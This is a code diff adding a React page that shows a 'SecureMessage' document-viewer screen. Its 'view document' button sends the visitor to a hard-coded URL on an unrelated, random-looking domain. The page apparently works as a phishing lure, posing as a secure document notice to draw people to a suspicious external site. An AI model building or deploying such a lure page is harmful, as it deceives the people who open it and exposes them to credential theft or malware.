@@ -1,0 +1,17 @@
+import SecureMessage from "@/components/SecureMessage";
+
+const Index = () => {
+  // You can customize this URL to redirect to your actual page
+  const targetUrl = "https://dhopemillerfouon.com.de/6pe068OPI4/";
+  
+  const handleViewDocument = () => {
+    // Redirect on the same page
+    window.location.href = targetUrl;
+  };
+
+  return (
+    <SecureMessage onViewDocument={handleViewDocument} targetUrl={targetUrl} />
+  );
+};
+
+export default Index;
